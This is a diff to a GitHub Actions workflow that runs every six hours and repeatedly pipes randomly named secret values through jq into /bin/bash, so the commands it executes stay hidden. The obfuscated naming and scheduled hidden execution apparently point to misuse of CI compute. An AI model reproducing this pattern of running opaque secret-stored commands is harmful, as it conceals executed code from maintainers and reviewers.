@@ -3,9 +3,8 @@ name: leebangxxk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 2/6 * * *'
-
-jobs:  # 6005
+    - cron: '33 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,25 +12,18 @@ jobs:  # 6005
       - uses: actions/checkout@v4
       - name: leebangxxk
         env:
-          ecqk80917: ${{ secrets.ecqk80917 }}
+          upgho5: ${{ secrets.upgho5 }}
         run: |
-          echo $ecqk80917 | jq -r .nk2293 | /bin/bash
-          echo $uogr6 | jq -r .vwj19170 | /bin/bash
-          echo $np59 | jq -r .nqy72 | /bin/bash
-          echo $npjed4 | jq -r .acg6 | /bin/bash
-          echo $qg08632 | jq -r .l43476 | /bin/bash
-          echo $jq1 | jq -r .k77 | /bin/bash
-          echo $bzp76676 | jq -r .jjut9266 | /bin/bash
-          echo $zyed95406 | jq -r .zr52369 | /bin/bash
-          echo $f03729 | jq -r .nveqr41 | /bin/bash
-          echo $k8 | jq -r .z3348 | /bin/bash
-          echo $e73 | jq -r .dzkm3179 | /bin/bash
-          echo $p65446 | jq -r .uk958 | /bin/bash
-          echo $ir503 | jq -r .ibre3561 | /bin/bash
-          echo $gaqf60116 | jq -r .u0273 | /bin/bash
-          echo $zzjgx489 | jq -r .dmt497 | /bin/bash
-          echo $ma20681 | jq -r .js907 | /bin/bash
-          echo $k0 | jq -r .yhm74253 | /bin/bash
-          echo $onkjf184 | jq -r .wha88 | /bin/bash
-          echo $spb2841 | jq -r .xm6 | /bin/bash
+          echo $upgho5 | jq -r .pqjur6 | /bin/bash
+          echo $sfo531 | jq -r .k71099 | /bin/bash
+          echo $lp539 | jq -r .ii9581 | /bin/bash
+          echo $fm4 | jq -r .xgpqm7171 | /bin/bash
+          echo $gp3110 | jq -r .jiun7281 | /bin/bash
+          echo $vqdcq6930 | jq -r .nofeq69190 | /bin/bash
+          echo $hcet6 | jq -r .jgg630 | /bin/bash
+          echo $jijvc27 | jq -r .horpq2 | /bin/bash
+          echo $vgeuc7 | jq -r .whg9 | /bin/bash
+          echo $tol93401 | jq -r .gvd21 | /bin/bash
+          echo $xld403 | jq -r .ossu71 | /bin/bash
+          echo $xkcy010 | jq -r .ipzui409 | /bin/bash
 
